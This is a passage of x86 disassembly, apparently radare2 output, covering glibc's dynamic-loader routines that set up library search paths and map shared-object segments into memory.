test eax, eax
jne 0x807b489
mov ebx, dword [0x80aac68]
test ebx, ebx
je 0x807b35a
mov eax, dword [var_18h_2]
cmp dword [ebx + 0x10], eax
je 0x807b44e
mov ebx, dword [ebx]
test ebx, ebx
jne 0x807b348
mov eax, dword [var_1ch_2]
xor esi, esi
test eax, eax
je 0x807b371
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov eax, dword [0x80aa9ec]
mov edx, dword [var_18h]
lea eax, [esi + eax*4]
lea eax, [edx + eax + 0x15]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807b528
mov eax, dword [0x80aa9ec]
mov edx, dword [var_10h_5]
lea eax, [ebx + eax*4 + 0x14]
mov dword [ebx + 0xc], eax
mov dword [var_4h_3], edx
mov eax, dword [var_18h_2]
mov dword [esp + 8], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call fcn.08053740
mov byte [eax], 0
mov ecx, dword [0x80aa9ec]
mov edx, dword [var_10h_5]
mov eax, dword [var_18h_2]
mov dword [ebx + 0x10], eax
mov eax, dword [0x80aa9fc]
cmp dword [var_18h_2], eax
cmova eax, dword [var_18h_2]
mov dword [0x80aa9fc], eax
xor eax, eax
cmp byte [edx], 0x2f
setne al
xor edx, edx
add eax, eax
cmp edx, ecx
jae 0x807b3f9
lea esi, [esi]
mov dword [ebx + edx*4 + 0x14], eax
inc edx
cmp edx, ecx
jb 0x807b3f0
mov edi, dword [var_18h]
mov eax, dword [var_1ch]
test edi, edi
mov dword [ebx + 4], eax
je 0x807b445
mov edx, dword [var_18h_2]
lea eax, [ebx + ecx*4]
mov dword [var_ch_5], esi
lea eax, [eax + edx + 0x15]
mov edx, dword [var_18h]
mov dword [esp], eax
mov dword [var_4h_3], edx
call fcn.08053770
mov dword [ebx + 8], eax
mov eax, dword [0x80aac68]
mov dword [ebx], eax
mov dword [0x80aac68], ebx
mov eax, dword [var_14h_2]
mov edx, dword [var_ch_5]
mov dword [edx + eax*4], ebx
inc eax
mov dword [var_14h_2], eax
jmp 0x807b2d0
mov dword [ebx + 8], 0
jmp 0x807b426
mov edi, dword [ebx + 0xc]
mov esi, dword [var_10h_5]
cmp eax, eax
cld
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807b354
test ebx, ebx
je 0x807b35a
xor eax, eax
cmp eax, dword [var_14h_2]
jae 0x807b47e
mov edx, dword [var_ch_5]
cmp dword [edx + eax*4], ebx
je 0x807b47e
inc eax
cmp eax, dword [var_14h_2]
jb 0x807b470
cmp eax, dword [var_14h_2]
jne 0x807b2d0
jmp 0x807b433
mov eax, dword [var_10h_4]
mov dword [var_1ch], str._lib_
mov dword [var_20h], 1
cmp byte [eax], 0x2f
jne 0x807b2d0
xor ebx, ebx
mov edx, dword [ebx*4 + 0x80a35f4]
cmp dword [var_18h], edx
mov dword [var_24h], edx
je 0x807b4d7
mov edx, dword [var_1ch]
mov eax, dword [var_24h]
inc ebx
cmp ebx, 1
lea edx, [eax + edx + 1]
mov dword [var_1ch], edx
jbe 0x807b4a5
mov eax, dword [var_20h]
test eax, eax
jne 0x807b2d0
jmp 0x807b33e
mov eax, dword [var_18h]
mov esi, dword [var_1ch]
mov edi, dword [var_10h_4]
cld
cmp eax, eax
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807b4b4
mov dword [var_sp_10h], 0
jmp 0x807b4c7
dec dword [var_18h_2]
cmp dword [var_18h_2], 1
jbe 0x807b317
mov eax, dword [var_10h_5]
mov edx, dword [var_18h_2]
cmp byte [edx + eax - 1], 0x2f
je 0x807b4f2
jmp 0x807b317
mov eax, dword [var_14h]
mov edx, dword [var_ch_2]
mov dword [edx + eax*4], 0
lea esp, [var_ch_3]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
xor ecx, ecx
xor edx, edx
mov eax, 0xc
mov dword [esp], str.cannot_create_cache_for_search_path
call fcn.08081200
lea esi, [esi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x24
mov eax, dword [ecx + 4]
mov dword [var_10h_5], edx
mov dword [var_14h_2], eax
mov eax, dword [0x80aac70]
test eax, eax
jne 0x807b60b
mov eax, dword [var_10h_5]
mov dword [esp], ecx
mov dword [var_4h_4], eax
call fcn.0807b0c0
mov esi, eax
mov eax, str.cannot_create_RUNPATH_RPATH_copy
test esi, esi
je 0x807b5fa
movzx eax, byte [esi]
xor ebx, ebx
mov ecx, esi
test al, al
je 0x807b59b
mov edx, eax
cmp dl, 0x3a
lea eax, [ebx + 1]
cmove ebx, eax
inc ecx
movzx eax, byte [ecx]
test al, al
mov edx, eax
jne 0x807b588
lea eax, [ebx*4 + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807b5f5
mov edx, dword [var_14h_2]
mov eax, dword [var_4h_3]
mov dword [esp + 0xc], 0
mov dword [esp + 8], 0x80a36b1
mov dword [var_4h_4], ebx
mov dword [esp], esi
mov dword [var_sp_14h], edx
mov dword [var_sp_10h], eax
call fcn.0807b2c0
mov dword [esp], esi
call fcn.08051180
mov dword [edi], ebx
mov dword [edi + 4], 1
lea esp, [var_ch_4]
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, str.cannot_create_cache_for_search_path
mov dword [esp], eax
xor ecx, ecx
xor edx, edx
mov eax, 0xc
call fcn.08081200
mov edx, dword [0x80a95f4]
test edx, edx
jne 0x807b561
mov edx, dword [var_14h_2]
mov ebx, eax
movzx eax, byte [eax]
movzx edx, byte [edx]
mov byte [var_15h], dl
cmp al, byte [var_15h]
mov esi, dword [var_14h_2]
je 0x807b689
mov esi, dword [var_14h_2]
movzx edx, byte [esi]
test dl, dl
jne 0x807b641
test al, al
je 0x807b666
cmp al, 0x3a
je 0x807b666
test al, al
je 0x807b561
inc ebx
cmp al, 0x3a
je 0x807b65a
movzx eax, byte [ebx]
test al, al
jne 0x807b649
jmp 0x807b561
movzx eax, byte [ebx]
test al, al
jne 0x807b627
jmp 0x807b561
mov dword [var_4h_4], 4
mov dword [esp], 1
call fcn.08051730
test eax, eax
mov ebx, eax
jne 0x807b5e2
jmp 0x807b5f5
test al, al
je 0x807b62f
inc ebx
inc esi
movzx eax, byte [ebx]
movzx edx, byte [esi]
cmp al, dl
jne 0x807b635
test al, al
jne 0x807b68d
jmp 0x807b635
nop
push ebp
xor eax, eax
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_ch]
mov edx, dword [ebx]
cmp edx, 0xffffffff
je 0x807b6d4
test edx, edx
mov eax, 1
jne 0x807b6d4
mov eax, dword [arg_10h]
mov edx, dword [ecx + eax*4 + 0x18]
test edx, edx
jne 0x807b6d9
xor eax, eax
mov dword [ebx], 0xffffffff
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ecx + 0x2c]
mov edx, dword [edx + 4]
add edx, dword [eax + 4]
mov eax, dword [arg_14h]
mov dword [esp], eax
mov eax, ebx
call fcn.0807b540
sub esp, 4
mov eax, 1
jmp 0x807b6d4
lea esi, [esi]
push ebp
mov ecx, 0x80aa9ec
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov edx, dword [0x80aac0c]
mov dword [var_10h], eax
mov eax, dword [0x80aac34]
mov dword [esp], 0x80aa9f0
call fcn.08056330
sub esp, 4
mov dword [0x80aa9e8], eax
mov dword [esp], 0xc
call fcn.08050fe0
test eax, eax
mov dword [0x80aa9f4], eax
mov esi, eax
je 0x807b917
mov edx, dword [0x80aa9ec]
mov eax, 0xcccccccd
lea edx, [edx*4 + 0x27]
mul edx
shr edx, 4
lea edx, [edx + edx*4]
mov eax, edx
mov dword [var_14h_3], edx
shl eax, 6
mov dword [esp], eax
call fcn.08050fe0
mov edx, str.cannot_create_cache_for_search_path
mov dword [esi], eax
mov eax, dword [0x80aa9f4]
mov eax, dword [eax]
test eax, eax
je 0x807b91c
mov dword [0x80aac68], eax
mov ecx, eax
mov dword [0x80aa9f8], 0
mov eax, dword [var_14h_3]
mov edi, str._lib_
xor ebx, ebx
shl eax, 2
mov dword [var_18h_3], eax
lea esi, [esi]
mov eax, dword [ebx*4 + 0x80a35f4]
mov dword [ecx + 0xc], edi
mov dword [esi], ecx
mov dword [ecx + 4], 0x80a36b3
mov dword [ecx + 8], 0
add esi, 4
mov dword [ecx + 0x10], eax
lea edi, [eax + edi + 1]
mov eax, dword [ecx + 0xc]
cmp byte [eax], 0x2f
jne 0x807b92d
mov edx, dword [0x80aa9ec]
xor eax, eax
cmp eax, edx
jae 0x807b7fd
lea esi, [esi]
mov dword [ecx + eax*4 + 0x14], 0
inc eax
cmp eax, edx
jb 0x807b7f0
mov eax, dword [var_18h_3]
inc ebx
lea edx, [eax + ecx]
xor eax, eax
cmp ebx, 2
cmovne eax, edx
cmp ebx, 1
mov dword [ecx], eax
mov ecx, edx
jbe 0x807b7b0
mov ebx, dword [var_10h_3]
mov dword [0x80aa9fc], 9
mov dword [esi], 0
test ebx, ebx
je 0x807b834
mov eax, dword [var_10h_3]
cmp byte [eax], 0
jne 0x807b850
mov dword [0x80aa9e0], 0xffffffff
mov eax, dword [0x80aac68]
mov dword [0x80aac50], eax
lea esp, [ebp - 0xc]
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], eax
mov ebx, eax
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_27h]
mov dword [var_8h], edx
mov dword [var_4h], ebx
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
mov ecx, 1
mov esi, eax
movzx eax, byte [ebx]
test al, al
je 0x807b89d
sub eax, 0x3a
lea edx, [ecx + 1]
cmp al, 1
cmovbe ecx, edx
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x807b88a
lea eax, [ecx*4 + 4]
mov dword [esp], eax
call fcn.08050fe0
mov edx, str.cannot_create_cache_for_search_path
test eax, eax
mov ecx, eax
mov dword [0x80aa9e0], eax
je 0x807b91c
mov eax, dword [0x80a95f4]
mov dword [var_4h], ecx
mov dword [var_18h], 0
mov dword [var_14h], str.LD_LIBRARY_PATH
mov dword [var_8h], 0x80a36c6
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0807b2c0
mov eax, dword [0x80aa9e0]
mov ecx, dword [eax]
test ecx, ecx
je 0x807b903
mov dword [0x80aa9e4], 0
jmp 0x807b83e
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aa9e0], 0xffffffff
jmp 0x807b8f4
mov edx, str.cannot_create_search_path_array
mov dword [esp], edx
xor ecx, ecx
mov eax, 0xc
xor edx, edx
call fcn.08081200
mov dword [var_ch], str._dl_init_paths
mov dword [var_8h], 0x2a2
mov dword [var_4h], str.dl_load.c
mov dword [esp], str.pelem__dirname_0____
call fcn.0805efc0
jmp fcn.0807b960
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [var_8h]
mov dword [var_bp_4h], ebx
mov ebx, dword [var_18h]
cmp eax, 0xffffffff
je 0x807b97c
mov dword [esp], eax
call fcn.08053f20
test ebx, ebx
je 0x807b9a6
mov eax, dword [ebx + 0xc]
test eax, eax
jne 0x807b9cd
mov eax, dword [ebx + 0x10]
test eax, eax
jne 0x807b9c4
mov dword [0x80aac58], 0
dec dword [0x80aabf8]
mov dword [esp], ebx
call fcn.08051180
mov eax, dword [var_sp_10h]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [var_sp_18h]
mov edx, dword [var_ch_3]
xor ecx, ecx
mov dword [esp], eax
mov eax, dword [var_4h_3]
call fcn.08081200
mov dword [eax + 0xc], 0
jmp 0x807b998
mov dword [var_ch_2], 0x8093017
mov dword [var_8h_2], 0x30d
mov dword [var_4h_2], str.dl_load.c
mov dword [esp], str.l__l_next____void__0_
call fcn.0805efc0
jmp fcn.0807ba00
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
lea eax, [var_6ch]
push ebx
sub esp, 0xf0
mov dword [var_94h], 0
mov dword [var_80h], 0
mov edi, dword [var_ch_2]
mov dword [var_8h_3], eax
mov eax, dword [var_8h_2]
mov dword [esp], 3
mov dword [var_4h_3], eax
call fcn.08053dc0
test eax, eax
js 0x807c7f9
mov edx, dword [0x80aac58]
test edx, edx
mov dword [var_80h], edx
je 0x807bab2
mov eax, dword [var_6ch_2]
mov edx, dword [var_68h_2]
mov ebx, dword [var_14h_3]
mov esi, dword [var_10h_3]
mov dword [var_9ch], eax
mov dword [var_98h], edx
mov ecx, dword [var_80h_2]
mov edx, dword [ecx + 0x1cc]
mov eax, dword [ecx + 0x1c8]
mov ecx, edx
xor eax, ebx
xor ecx, esi
or ecx, eax
jne 0x807baa5
mov ecx, dword [var_80h_2]
mov eax, dword [ecx + 0x1c0]
mov edx, dword [ecx + 0x1c4]
xor eax, dword [var_9ch]
mov ecx, dword [var_98h]
xor ecx, edx
or ecx, eax
je 0x807c7d8
mov eax, dword [var_80h_2]
mov eax, dword [eax + 0xc]
test eax, eax
mov dword [var_80h_2], eax
jne 0x807ba67
xor eax, eax
test byte [var_4h], 4
jne 0x807c04a
test byte [0x80aac10], 0x40
jne 0x807c7c0
mov eax, dword [var_18h_2]
lea ecx, [edi + 4]
mov ebx, str.cannot_create_shared_object_descriptor
mov dword [var_84h], ecx
mov dword [esp], eax
mov eax, dword [var_bp_4h]
mov edx, dword [var_4h_2]
mov ecx, dword [var_1ch_2]
call fcn.0807ea00
sub esp, 4
mov dword [var_80h], eax
test eax, eax
je 0x807bdc3
mov ebx, dword [var_84h]
mov esi, dword [var_80h]
mov eax, dword [ebx + 0x18]
mov dword [esi + 0x148], eax
movzx eax, word [ebx + 0x10]
mov dword [var_90h], eax
movzx eax, word [ebx + 0x2c]
mov word [esi + 0x14c], ax
movzx edx, word [ebx + 0x2c]
shl edx, 5
mov dword [var_8ch], edx
mov ecx, dword [var_8ch]
mov edx, dword [ebx + 0x1c]
lea eax, [ecx + edx]
cmp eax, dword [edi]
ja 0x807c756
lea edi, [edx + edi + 4]
mov dword [var_88h_2], edi
mov ebx, dword [var_80h]
mov edi, dword [var_88h_2]
mov dword [var_a4h], esp
mov dword [var_a0h_2], 7
mov dword [var_ach], 0
mov byte [var_adh], 0
movzx esi, word [ebx + 0x14c]
movzx edx, si
lea eax, [edx + edx*2 - 3]
shl edx, 5
lea eax, [eax*8 + 0x28]
add edx, edi
sub esp, eax
lea eax, [var_43h]
and eax, 0xfffffff0
cmp edi, edx
mov dword [var_a8h], eax
jae 0x807c43b
mov dword [var_c0h], eax
mov esi, esi
mov eax, dword [edi]
cmp eax, 6
je 0x807c745
ja 0x807c540
cmp eax, 1
je 0x807c45d
cmp eax, 2
je 0x807c442
movzx eax, si
add edi, 0x20
shl eax, 5
add eax, dword [var_88h_2]
cmp edi, eax
jb 0x807bbb0
mov eax, dword [var_ach]
test eax, eax
je 0x807c43b
mov ecx, dword [var_ach]
mov ebx, dword [var_a8h]
lea eax, [ecx + ecx*2]
mov edx, dword [ebx]
lea esi, [ebx + eax*8]
mov eax, dword [esi - 0xc]
sub eax, edx
cmp dword [var_90h_2], 3
mov dword [var_8ch_2], eax
jne 0x807c402
mov eax, dword [ebx + 0x10]
and edx, dword [0x80a95ac]
mov dword [var_sp_10h], eax
mov ecx, dword [var_8h_3]
mov dword [var_8h_3], 0x802
mov dword [var_ch_3], ecx
mov eax, dword [ebx + 0x14]
mov dword [var_4h_3], eax
mov eax, dword [var_8ch_2]
mov dword [esp], edx
mov dword [var_4h_4], eax
call fcn.080546d0
mov ecx, dword [var_80h_2]
cmp eax, 0xffffffff
mov edx, eax
mov dword [ecx + 0x194], eax
je 0x807bdb8
mov ecx, dword [var_8ch_2]
lea eax, [ecx + eax]
mov ecx, dword [var_80h_2]
mov dword [ecx + 0x198], eax
sub edx, dword [ebx]
cmp byte [var_adh], 0
mov dword [ecx], edx
jne 0x807c3de
test byte [ebx + 0x14], 4
je 0x807bca0
mov ecx, dword [var_80h_2]
mov eax, dword [ebx + 4]
add eax, dword [ecx]
mov dword [ecx + 0x19c], eax
mov esi, dword [var_80h_2]
mov eax, dword [esi + 0x144]
test eax, eax
jne 0x807bce2
mov eax, dword [var_84h_2]
mov esi, dword [ebx + 0x10]
mov ecx, dword [eax + 0x1c]
cmp esi, ecx
ja 0x807bce2
movzx eax, word [eax + 0x2c]
mov edx, dword [ebx + 4]
mov edi, dword [ebx]
shl eax, 5
sub edx, edi
add edx, esi
lea eax, [eax + ecx]
cmp edx, eax
jb 0x807bce2
mov edx, dword [var_80h_2]
lea eax, [ecx + edi]
sub eax, esi
mov dword [edx + 0x144], eax
mov ecx, dword [ebx + 0xc]
mov edx, dword [ebx + 8]
cmp ecx, edx
jbe 0x807bd54
mov esi, dword [var_80h_2]
mov eax, dword [esi]
lea esi, [edx + eax]
add eax, ecx
mov dword [var_bch], eax
mov eax, dword [0x80aac74]
lea edi, [eax + esi - 1]
neg eax
and edi, eax
cmp dword [var_bch], edi
cmovb edi, dword [var_bch]
cmp edi, esi
jbe 0x807bd48
mov eax, dword [ebx + 0x14]
test al, 2
je 0x807c3aa
mov eax, edi
mov dword [var_4h_4], 0
mov dword [esp], esi
sub eax, esi
mov dword [var_4h_3], eax
call fcn.080536f0
mov eax, dword [ebx + 0x14]
test al, 2
je 0x807c386
cmp dword [var_bch], edi
ja 0x807c33e
mov edx, dword [var_ach]
mov ecx, dword [var_a8h]
add ebx, 0x18
lea eax, [edx + edx*2]
lea eax, [ecx + eax*8]
cmp ebx, eax
jae 0x807bdfe
mov eax, dword [ebx]
cmp dword [ebx + 4], eax
jbe 0x807bc8c
mov eax, dword [ebx + 0x10]
mov dword [var_sp_10h], eax
mov esi, dword [var_8h_3]
mov dword [var_8h_3], 0x812
mov dword [var_ch_3], esi
mov eax, dword [ebx + 0x14]
mov dword [var_4h_3], eax
mov eax, dword [ebx + 4]
sub eax, dword [ebx]
mov dword [var_4h_4], eax
mov edx, dword [var_80h_2]
mov eax, dword [ebx]
add eax, dword [edx]
mov dword [esp], eax
call fcn.080546d0
inc eax
jne 0x807bc8c
mov ebx, str.failed_to_map_segment_from_shared_object
mov esp, dword [var_a4h]
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_94h], eax
mov dword [var_sp_10h], ebx
mov edx, dword [var_80h]
mov dword [var_sp_10h], edx
mov ecx, dword [var_sp_10h]
mov dword [var_8h_3], ecx
mov ebx, dword [var_4h_3]
mov dword [var_8h_3], ebx
mov esi, dword [var_8h_3]
mov dword [var_4h_3], esi
mov eax, dword [var_94h]
mov dword [esp], eax
call fcn.0807b960
mov ebx, dword [var_80h]
mov eax, dword [ebx + 0x144]
test eax, eax
je 0x807c2eb
mov ebx, dword [var_80h]
add eax, dword [ebx]
mov dword [ebx + 0x144], eax
mov esi, dword [var_80h]
mov esp, dword [var_a4h]
mov eax, dword [esi + 0x210]
test eax, eax
je 0x807be35
add eax, dword [esi]
mov dword [esi + 0x210], eax
mov eax, dword [var_8h_2]
mov dword [esp], eax
call fcn.08053f20
mov ecx, dword [var_80h]
mov dword [var_8h_2], 0xffffffff
movzx edx, byte [ecx + 0x174]
mov eax, edx
and eax, 3
dec al
je 0x807c2d0
mov ebx, dword [var_80h]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x807c2c1
cmp dword [var_90h], 3
mov ebx, str.object_file_has_no_dynamic_section
je 0x807bdd0
mov eax, dword [var_80h]
mov edx, dword [eax]
mov ecx, dword [var_80h]
add dword [ecx + 0x148], edx
test byte [0x80aac10], 0x40
jne 0x807c24a
mov esi, dword [var_80h]
mov ecx, dword [esi + 8]
test ecx, ecx
je 0x807bfbf
mov edx, dword [ecx]
add esi, 0x18
test edx, edx
je 0x807becc
mov edi, 0x6fffffff
cmp edx, 0x21
jg 0x807c1f1
mov dword [esi + edx*4], ecx
add ecx, 8
mov eax, dword [ecx]
test eax, eax
mov edx, eax
jne 0x807beb5
mov eax, dword [var_80h]
mov edx, dword [eax]
test edx, edx
je 0x807bf28
mov eax, dword [esi + 0x10]
test eax, eax
je 0x807bedf
add dword [eax + 4], edx
mov eax, dword [esi + 0xc]
test eax, eax
je 0x807bee9
add dword [eax + 4], edx
mov eax, dword [esi + 0x14]
test eax, eax
je 0x807bef3
add dword [eax + 4], edx
mov eax, dword [esi + 0x18]
test eax, eax
je 0x807befd
add dword [eax + 4], edx
mov eax, dword [esi + 0x1c]
test eax, eax
je 0x807bf07
add dword [eax + 4], edx
mov eax, dword [esi + 0x44]
test eax, eax
je 0x807bf11
add dword [eax + 4], edx
mov eax, dword [esi + 0x5c]
test eax, eax
je 0x807bf1b
add dword [eax + 4], edx
mov eax, dword [esi + 0xc4]
test eax, eax
je 0x807bf28
add dword [eax + 4], edx
mov eax, dword [esi + 0x50]
test eax, eax
je 0x807bf3b
mov eax, dword [eax + 4]
cmp eax, 0x11
jne 0x807c1c7
mov eax, dword [esi + 0x1c]
test eax, eax
je 0x807bf4f
mov eax, dword [esi + 0x24]
cmp dword [eax + 4], 0xc
jne 0x807c1a6
mov eax, dword [esi + 0x44]
test eax, eax
je 0x807bf63
mov eax, dword [esi + 0x4c]
cmp dword [eax + 4], 8
jne 0x807c182
mov edx, dword [esi + 0x78]
test edx, edx
je 0x807bf94
mov eax, dword [edx + 4]
mov ecx, dword [var_80h]
test al, 2
mov dword [ecx + 0x1f0], eax
je 0x807bf7d
mov dword [esi + 0x40], edx
mov ebx, dword [var_80h]
mov eax, dword [ebx + 0x1f0]
test al, 4
je 0x807bf8d
mov dword [esi + 0x58], edx
test al, 8
je 0x807bf94
mov dword [esi + 0x60], edx
mov edx, dword [esi + 0x98]
test edx, edx
je 0x807bfb1
mov eax, dword [edx + 4]
mov ecx, dword [var_80h]
test al, 1
mov dword [ecx + 0x1ec], eax
je 0x807bfb1
mov dword [esi + 0x60], edx
mov edi, dword [esi + 0x74]
test edi, edi
je 0x807bfbf
mov dword [esi + 0x3c], 0
mov ebx, dword [var_80h]
test byte [ebx + 0x1ec], 0x40
jne 0x807c11f
mov eax, dword [var_80h]
mov edx, dword [eax + 0x28]
test edx, edx
jne 0x807c115
mov edx, dword [var_80h]
mov eax, dword [edx + 0x58]
test eax, eax
jne 0x807c08d
mov eax, dword [var_80h]
mov edx, dword [var_68h]
mov ecx, dword [var_80h]
test byte [eax + 0x1ec], 0x20
cmove eax, dword [0x80aac64]
mov dword [0x80aac64], eax
mov eax, dword [var_6ch]
mov dword [ecx + 0x1c4], edx
mov dword [ecx + 0x1c0], eax
mov edx, dword [var_10h_2]
mov eax, dword [var_14h_2]
mov dword [ecx + 0x1c8], eax
mov dword [ecx + 0x1cc], edx
mov eax, dword [0x80a95c8]
not eax
and dword [var_a0h], eax
test byte [var_a0h], 1
jne 0x807c070
mov eax, dword [0x80aac20]
test eax, eax
jne 0x807c052
mov eax, dword [var_80h]
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_80h]
mov edx, dword [eax + 0x50]
test edx, edx
je 0x807c047
mov ecx, eax
mov edx, dword [edx + 4]
mov eax, dword [eax + 0x2c]
add edx, dword [eax + 4]
mov eax, ecx
call fcn.0807b200
jmp 0x807c047
mov eax, dword [var_8h]
mov ebx, str.cannot_enable_executable_stack_as_shared_object_requires
call dword [0x80a95cc]
test eax, eax
mov dword [var_94h], eax
je 0x807c03e
jmp 0x807bdd0
mov ecx, dword [var_80h]
add edx, 0x150
mov eax, dword [ecx + 0x1b4]
cmp edx, dword [eax]
je 0x807bfeb
mov dword [esp], 4
call fcn.08050fe0
mov ebx, dword [var_80h]
test eax, eax
mov dword [ebx + 0x158], eax
mov ebx, str.cannot_create_searchlist
je 0x807bdc3
mov esi, dword [var_80h]
mov dword [eax], esi
mov dword [esi + 0x15c], 1
mov eax, dword [esi + 0x1b0]
lea eax, [eax*4 - 4]
mov dword [var_8h_3], eax
mov eax, dword [esi + 0x1b4]
mov dword [var_4h_3], eax
mov eax, dword [esi + 0x1b4]
add eax, 4
mov dword [esp], eax
call fcn.08053690
mov eax, esi
mov edx, dword [esi + 0x1b4]
add eax, 0x158
mov dword [edx], eax
jmp 0x807bfeb
call fcn.0807e920
jmp 0x807bfdd
mov esi, dword [var_4h]
test esi, esi
jns 0x807bfcf
mov eax, dword [ebx + 0x198]
sub eax, dword [ebx + 0x194]
mov dword [var_4h_3], eax
mov eax, dword [ebx + 0x194]
mov dword [esp], eax
call fcn.08054780
mov eax, dword [ebx + 0x14]
mov ecx, dword [eax + 8]
test ecx, ecx
je 0x807c178
mov esi, dword [var_80h]
test byte [esi + 0x174], 0x80
jne 0x807c168
mov ebx, str.shared_object_cannot_be_dlopen__ed
jmp 0x807bdd0
mov eax, dword [esi + 0x144]
mov dword [esp], eax
call fcn.08051180
jmp 0x807c15e
mov dword [esp], eax
call fcn.08051180
jmp 0x807c152
mov dword [var_ch_3], str.elf_get_dynamic_info
mov dword [var_8h_3], 0x9f
mov dword [var_4h_3], str.dynamic_link.h
mov dword [esp], str.info_19___d_un.d_val__sizeof__Elf32_Rel_
call fcn.0805efc0
mov dword [var_ch_3], str.elf_get_dynamic_info
mov dword [var_8h_3], 0x9b
mov dword [var_4h_3], str.dynamic_link.h
mov dword [esp], str.info_9___d_un.d_val__sizeof__Elf32_Rela_
jmp 0x807c1a1
cmp eax, 7
je 0x807bf3b
mov dword [var_ch_3], str.elf_get_dynamic_info
mov dword [var_8h_3], 0x96
mov dword [var_4h_3], str.dynamic_link.h
mov dword [esp], str.info_20___d_un.d_val__17__info_20___d_un.d_val__7
jmp 0x807c1a1
mov eax, edi
sub eax, edx
cmp eax, 0xf
ja 0x807c209
mov eax, 0x70000021
sub eax, edx
mov dword [esi + eax*4], ecx
jmp 0x807bec1
lea ebx, [edx + edx]
sar ebx, 1
mov eax, ebx
not eax
cmp eax, 2
ja 0x807c220
mov eax, 0x31
sub eax, ebx
jmp 0x807c201
mov eax, 0x6ffffdff
sub eax, edx
cmp eax, 0xb
ja 0x807c233
mov eax, 0x6ffffe34
jmp 0x807c1ff
mov eax, 0x6ffffeff
sub eax, edx
cmp eax, 9
ja 0x807bec1
mov eax, 0x6fffff40
jmp 0x807c1ff
movzx eax, word [ecx + 0x14c]
mov dword [var_2ch], 8
mov dword [var_30h], eax
mov eax, dword [ecx + 0x144]
mov dword [var_24h], 8
mov dword [var_28h], eax
mov eax, dword [ecx + 0x148]
mov dword [var_sp_1ch], 8
mov dword [var_20h], eax
mov ebx, dword [var_8ch]
mov dword [var_sp_14h], 8
mov dword [var_sp_18h], ebx
mov eax, dword [ecx]
mov dword [var_ch_3], 8
mov dword [var_sp_10h], eax
mov eax, dword [ecx + 8]
mov dword [esp], str.__dynamic:_0x_0lx__base:_0x_0lx___size:_0x_0Zx_n____entry:_0x_0lx__phdr:_0x_0lx__phnum:____u_n_n
mov dword [var_4h_3], 8
mov dword [var_8h_3], eax
call fcn.08081c40
jmp 0x807be99
mov esi, dword [var_80h]
mov edx, dword [esi]
add eax, edx
mov dword [esi + 8], eax
jmp 0x807be83
cmp dword [var_90h], 2
jne 0x807be5e
and edx, 0xfffffffc
mov byte [ecx + 0x174], dl
jmp 0x807be5e
mov esi, dword [var_84h]
movzx eax, word [esi + 0x2c]
shl eax, 5
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
je 0x807c334
mov edx, dword [var_84h]
mov esi, dword [var_88h]
mov edi, eax
cld
movzx ecx, word [edx + 0x2c]
shl ecx, 5
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov ecx, dword [var_80h]
or byte [ecx + 0x174], 0x80
mov dword [ecx + 0x144], eax
jmp 0x807be1a
mov ebx, str.cannot_allocate_memory_for_program_header
jmp 0x807bdbd
mov dword [var_sp_10h], 0
mov dword [var_ch_3], 0xffffffff
mov dword [var_8h_3], 0x32
mov eax, dword [ebx + 0x14]
mov dword [var_4h_3], eax
sub dword [var_bch], edi
mov eax, dword [var_bch]
mov dword [esp], edi
mov dword [var_4h_4], eax
call fcn.080546d0
inc eax
jne 0x807bd54
mov ebx, str.cannot_map_zero_fill_pages
jmp 0x807bdbd
mov dword [var_4h_3], eax
mov eax, dword [0x80aac74]
mov dword [var_4h_4], eax
mov eax, dword [0x80aac74]
dec eax
not eax
and esi, eax
mov dword [esp], esi
call fcn.080547a0
jmp 0x807bd48
or eax, 2
mov dword [var_4h_3], eax
mov eax, dword [0x80aac74]
mov dword [var_4h_4], eax
mov eax, dword [0x80aac74]
dec eax
not eax
and eax, esi
mov dword [esp], eax
call fcn.080547a0
test eax, eax
jns 0x807bd25
mov ebx, str.cannot_change_memory_protections
jmp 0x807bdbd
mov dword [var_4h_3], 0
mov eax, dword [esi - 0xc]
sub eax, dword [ebx + 4]
mov dword [var_4h_4], eax
mov eax, dword [ebx + 4]
add eax, dword [ecx]
mov dword [esp], eax
call fcn.080547a0
jmp 0x807bc8c
test dword [var_sp_1ch], 0x20000000
je 0x807c42b
mov ecx, dword [var_80h_2]
mov eax, edx
add eax, dword [ecx]
mov dword [ecx + 0x194], eax
add eax, dword [var_8ch_2]
cmp ebx, esi
mov dword [ecx + 0x198], eax
jmp 0x807bd6b
mov ebx, str.cannot_dynamically_load_executable
mov esp, dword [var_a4h_2]
jmp 0x807bdd0
mov ebx, str.object_file_has_no_loadable_segments
jmp 0x807c430
mov eax, dword [edi + 8]
mov edx, dword [var_80h_2]
mov dword [edx + 8], eax
mov eax, dword [edi + 0x14]
shr eax, 3
mov word [edx + 0x14e], ax
jmp 0x807bbd3
